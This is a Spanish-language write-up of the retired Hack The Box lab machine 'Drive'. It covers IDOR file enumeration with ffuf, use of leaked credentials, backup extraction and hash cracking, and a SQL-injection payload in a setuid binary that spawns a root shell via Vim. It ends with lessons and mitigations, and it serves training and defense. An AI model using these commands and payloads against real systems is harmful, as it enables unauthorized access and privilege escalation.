---
machine: Drive
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, idor, gitea, sqlite, rop, privesc]
---

# Drive — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La plataforma de almacenamiento DoodleGrive expone `/[id]/getFileDetail/` y `/[id]/block/` sin comprobar el propietario. Un IDOR en `block` permite leer archivos privados, entre ellos unas credenciales de `martin`. Desde su cuenta se accede a Gitea, donde el repositorio de la web revela la contraseña de los backups `.7z`; al extraerlos se obtienen hashes de varios usuarios y una contraseña de `tom`. En su home hay un binario setuid, `doodleGrive-cli`, con una inyección SQL en la opción de activar usuarios. `edit()` y `VISUAL=vim` permiten ejecutar una shell como root; el buffer overflow/ROP del mismo binario es la ruta intencionada.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH 8.2p1 Ubuntu 20.04.
- `80` nginx 1.18.0 con redirección a `drive.htb`.
- `3000` aparece filtrado desde fuera; Gitea escucha en localhost.

```bash
echo '<IP> drive.htb' | sudo tee -a /etc/hosts
```

La web permite registrar una cuenta y subir archivos. El panel usa rutas como `/100/getFileDetail/` y `/100/block/`, y las cookies `csrftoken`/`sessionid` delatan Django.

## Enumeración

Se crea una cuenta y se enumeran IDs con `ffuf`, filtrando los `500`:

```bash
ffuf -u http://drive.htb/FUZZ/getFileDetail/ -w <(seq 1 500) \
  -fc 500 -H 'Cookie: csrftoken=<TOKEN>; sessionid=<SESSION>'
```

Los IDs `79`, `98`, `99` y `101` devuelven `401`, pero `/[id]/block/` muestra su contenido sin autorización. El archivo `79` contiene credenciales de `martin`; los demás describen la función de edición, un backup diario en `/var/www/backups` y problemas de seguridad.

## Foothold

Las credenciales de `martin` funcionan por SSH:

```bash
ssh martin@drive.htb
```

En `/var/www/backups` hay varios `.7z` y un `db.sqlite3` legible. El repositorio de Gitea de `martin` (misma contraseña que la web) contiene `db_backup.sh`, con la contraseña de los archivos comprimidos. Se extraen los backups y se comparan las tablas `accounts_customuser`:

```bash
7z e -o/dev/shm 1_Oct_db_backup.sqlite3.7z -p'<BACKUP_PASSWORD>'
sqlite3 /dev/shm/oct.sqlite3 \
  'select username,password from accounts_customuser;'
```

Los hashes de Django SHA-1 de `tomHands` cambian entre backups. `hashcat -m 124` recupera varias contraseñas; una de ellas funciona por SSH:

```bash
hashcat -m 124 tom_hashes rockyou.txt
ssh tom@drive.htb
```

## Movimiento lateral

El movimiento es `martin` → `tom` mediante la base de datos filtrada. `tom` conserva el acceso SSH y su home contiene la flag de usuario y el binario setuid.

## Escalada de privilegios

```bash
ls -l ~/doodleGrive-cli
# -rwsr-x--- root tom
./doodleGrive-cli
```

El binario pide usuario y contraseña y ofrece un menú. La opción 5 construye una consulta de activación con el nombre introducido. Con `VISUAL=/usr/bin/vim`, una inyección que llame a `edit(username)` abre Vim; desde él, `:!/bin/bash` ejecuta una shell con el UID efectivo de root:

```bash
VISUAL=/usr/bin/vim ./doodleGrive-cli
# usuario válido y su contraseña
# opción 5
"&edit(username);-- -
# en Vim:
:!/bin/bash
```

La ruta intencionada es un buffer overflow con fuga de canary mediante format string y ROP a `system("/bin/sh")`; el SQLi con `load_extension` es otra variante. Las tres llegan a root.

## Evidencia

- IDs `401` accesibles a través de `/[id]/block/`.
- Credenciales de `martin` en el archivo `79`.
- `db_backup.sh` con la contraseña de los `.7z`.
- Hashes distintos de `tomHands` y contraseña válida por SSH.
- `doodleGrive-cli` con bit setuid y shell root tras `:!/bin/bash`.

## Lecciones aprendidas

- Un IDOR puede estar en una acción secundaria (`block`) aunque el endpoint principal sí compruebe permisos.
- Los backups y el historial de Git conservan secretos y versiones antiguas de hashes.
- Un setuid que construye SQL con entrada del usuario combina dos clases de vulnerabilidad.
- Vale la pena revisar las rutas no intencionadas: el binario tenía SQLi, `load_extension` y un overflow.

## Mitigaciones y detección

- Comprobar propiedad y pertenencia a grupo en cada endpoint, no solo en la vista principal.
- No guardar contraseñas de backups en repositorios; usar un gestor de secretos y rotarlas.
- Parametrizar las consultas SQL y no permitir que `edit()` o `load_extension` se activen desde la entrada.
- Compilar con canary, PIE y RELRO completo; no instalar binarios setuid de desarrollo.
- Detectar accesos secuenciales a IDs ajenos, extracción de `.7z` y ejecución de `vim` desde un setuid.

## Referencias

- [0xdf — Drive](https://0xdf.gitlab.io/2024/02/17/htb-drive.html)
- [IppSec — Drive](https://www.youtube.com/watch?v=HM8_Pf8zxko)
- [Hack The Box — Drive](https://app.hackthebox.com/machines/drive)
